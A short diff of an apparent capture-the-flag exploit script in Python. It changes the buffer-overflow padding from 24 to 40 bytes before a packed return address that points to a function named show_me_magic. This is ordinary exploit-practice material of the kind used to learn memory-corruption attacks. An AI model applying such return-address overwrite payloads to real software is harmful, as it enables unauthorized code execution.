@@ -13,7 +13,7 @@ def p64(n):
     return n.to_bytes(8, byteorder='little')
 
 # 創建 payload
-junk = b'a' * 24
+junk = b'a' * 40
 show_me_magic = 0x0000000000400627
 payload = junk + p64(show_me_magic)
 
